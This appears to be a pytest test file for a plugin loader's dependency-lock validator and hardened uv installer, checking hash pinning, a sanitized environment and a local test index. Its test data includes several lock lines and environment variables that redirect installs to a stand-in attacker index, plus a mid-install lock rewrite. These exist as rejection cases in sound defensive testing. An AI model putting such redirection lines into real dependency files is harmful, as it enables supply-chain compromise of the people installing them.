"""Plugin dependency locks must not redirect the trusted installer or run builds."""

import subprocess
from pathlib import Path
from unittest.mock import Mock

import pytest

from app.plugins.loader import PluginLoadError, _install_python_deps, _validate_python_lock

HASH = "a" * 64
VALID = f"example-package==1.2.3 --hash=sha256:{HASH}\n"


@pytest.mark.parametrize(
    "text",
    [
        "--index-url https://attacker.invalid/simple\n" + VALID,
        "--extra-index-url https://attacker.invalid/simple\n" + VALID,
        "-r other.txt\n" + VALID,
        "-c other.txt\n" + VALID,
        f"example-package @ https://attacker.invalid/a.whl --hash=sha256:{HASH}",
        f"example-package>=1.2.3 --hash=sha256:{HASH}",
        f"example-package==1.* --hash=sha256:{HASH}",
        f"example-package==1.2.3 --hash=md5:{HASH}",
        f"example-package==1.2.3 --hash=sha256:{HASH} --trusted-host attacker.invalid",
        "example-package==1.2.3",
        f"not-example-package==1.2.3 --hash=sha256:{HASH}",
        "# comment only\n",
        "x" * (1024 * 1024 + 1),
    ],
)
def test_unsafe_or_incomplete_lock_is_rejected(text):
    with pytest.raises(PluginLoadError):
        _validate_python_lock(text, ["example-package>=1"])


def test_multiline_lock_accepts_hashes_markers_and_canonical_names():
    text = (
        '# generated lock\nexample_package==1.2.3; python_version >= "3.13" \\\n'
        f"    --hash=sha256:{HASH} \\\n    --hash=sha256:{'b' * 64}\n"
        "    # via plugin\n"
    )
    _validate_python_lock(text, ["Example.Package[extra]>=1"])


def test_installer_uses_validated_snapshot_and_ignores_external_configuration(
    tmp_path, monkeypatch
):
    requirement = tmp_path / "requirements.txt"
    requirement.write_text(VALID)
    monkeypatch.setenv("UV_EXTRA_INDEX_URL", "https://attacker.invalid/simple")
    monkeypatch.setenv("PIP_INDEX_URL", "https://attacker.invalid/simple")
    monkeypatch.setenv("VIRTUAL_ENV", "/wrong/venv")
    monkeypatch.setattr("app.plugins.loader.shutil.which", lambda _: "/trusted/uv")
    commands = []
    lock_paths = []

    def run(command, **kwargs):
        commands.append(command)
        assert not any(key.startswith(("UV_", "PIP_")) for key in kwargs["env"])
        assert "VIRTUAL_ENV" not in kwargs["env"]
        if len(commands) == 1:
            assert "--without-pip" in command
            requirement.write_text("--index-url https://attacker.invalid/simple\n" + VALID)
        else:
            assert command[0] == "/trusted/uv"
            for flag in [
                "--no-config",
                "--no-cache",
                "--no-python-downloads",
                "--require-hashes",
                "--no-deps",
            ]:
                assert flag in command
            assert command[command.index("--only-binary") + 1] == ":all:"
            assert command[command.index("--python") + 1] == str(tmp_path / ".venv/bin/python")
            lock = Path(command[command.index("-r") + 1])
            assert lock.read_text() == VALID
            assert lock.stat().st_mode & 0o777 == 0o600
            lock_paths.append(lock)
        return Mock(returncode=0)

    monkeypatch.setattr("app.plugins.loader.subprocess.run", run)
    _install_python_deps(tmp_path, ["example-package"])
    assert len(commands) == 2
    assert all(not path.exists() for path in lock_paths)


@pytest.mark.parametrize(
    "failure",
    [
        subprocess.CalledProcessError(1, "uv", stderr=b"https://secret:password@index.invalid"),
        subprocess.TimeoutExpired("uv", 180),
        OSError("cannot execute installer"),
    ],
)
def test_installer_failures_are_bounded_and_do_not_disclose_output(
    tmp_path, monkeypatch, caplog, failure
):
    (tmp_path / "requirements.txt").write_text(VALID)
    monkeypatch.setattr("app.plugins.loader.shutil.which", lambda _: "/trusted/uv")
    monkeypatch.setattr("app.plugins.loader.subprocess.run", Mock(side_effect=failure))
    with pytest.raises(PluginLoadError) as exc:
        _install_python_deps(tmp_path, ["example-package"])
    assert "secret:password" not in str(exc.value) + caplog.text


def test_invalid_lock_never_starts_an_installer(tmp_path, monkeypatch):
    (tmp_path / "requirements.txt").write_text("--find-links /tmp/wheels\n" + VALID)
    run = Mock()
    monkeypatch.setattr("app.plugins.loader.subprocess.run", run)
    with pytest.raises(PluginLoadError):
        _install_python_deps(tmp_path, ["example-package"])
    run.assert_not_called()


@pytest.mark.parametrize("valid_hash", [True, False])
def test_real_installer_enforces_wheel_hashes_in_a_pip_free_venv(tmp_path, monkeypatch, valid_hash):
    """Exercise uv and CPython, using a local index and a wheel with no dependencies."""
    import base64
    import csv
    import hashlib
    import io
    import sys
    import threading
    import zipfile
    from functools import partial
    from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer

    from app.core.config import settings

    index = tmp_path / "index"
    package = index / "simple" / "freesdn-release-probe"
    package.mkdir(parents=True)
    wheel = package / "freesdn_release_probe-1.0.0-py3-none-any.whl"
    info = "freesdn_release_probe-1.0.0.dist-info"
    files = {
        "freesdn_release_probe.py": b'VALUE = "verified wheel"\n',
        f"{info}/METADATA": (
            b"Metadata-Version: 2.1\nName: freesdn-release-probe\nVersion: 1.0.0\n"
        ),
        f"{info}/WHEEL": (
            b"Wheel-Version: 1.0\nGenerator: FreeSDN-test\n"
            b"Root-Is-Purelib: true\nTag: py3-none-any\n"
        ),
    }
    records = io.StringIO()
    writer = csv.writer(records)
    for name, content in files.items():
        digest = base64.urlsafe_b64encode(hashlib.sha256(content).digest()).rstrip(b"=")
        writer.writerow([name, "sha256=" + digest.decode(), len(content)])
    writer.writerow([f"{info}/RECORD", "", ""])
    files[f"{info}/RECORD"] = records.getvalue().encode()
    with zipfile.ZipFile(wheel, "w") as archive:
        for name, content in files.items():
            archive.writestr(name, content)
    (package / "index.html").write_text(f'<a href="{wheel.name}">{wheel.name}</a>')

    class Handler(SimpleHTTPRequestHandler):
        def log_message(self, *_args):
            pass

    server = ThreadingHTTPServer(("127.0.0.1", 0), partial(Handler, directory=str(index)))
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    monkeypatch.setattr(
        settings, "PLUGIN_PYPI_INDEX_URL", f"http://127.0.0.1:{server.server_port}/simple"
    )
    plugin = tmp_path / "plugin"
    plugin.mkdir()
    digest = hashlib.sha256(wheel.read_bytes()).hexdigest() if valid_hash else "0" * 64
    (plugin / "requirements.txt").write_text(
        f"freesdn-release-probe==1.0.0 --hash=sha256:{digest}\n"
    )
    python = plugin / ".venv" / ("Scripts/python.exe" if sys.platform == "win32" else "bin/python")
    try:
        if valid_hash:
            _install_python_deps(plugin, ["freesdn-release-probe==1.0.0"])
            code = "import freesdn_release_probe; assert freesdn_release_probe.VALUE == 'verified wheel'"
        else:
            with pytest.raises(PluginLoadError, match="dependency installation failed"):
                _install_python_deps(plugin, ["freesdn-release-probe==1.0.0"])
            code = "import importlib.util; assert importlib.util.find_spec('freesdn_release_probe') is None"
        subprocess.run([str(python), "-I", "-c", code], check=True, timeout=15)
        subprocess.run(
            [
                str(python),
                "-I",
                "-c",
                "import importlib.util; assert importlib.util.find_spec('pip') is None",
            ],
            check=True,
            timeout=15,
        )
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=5)
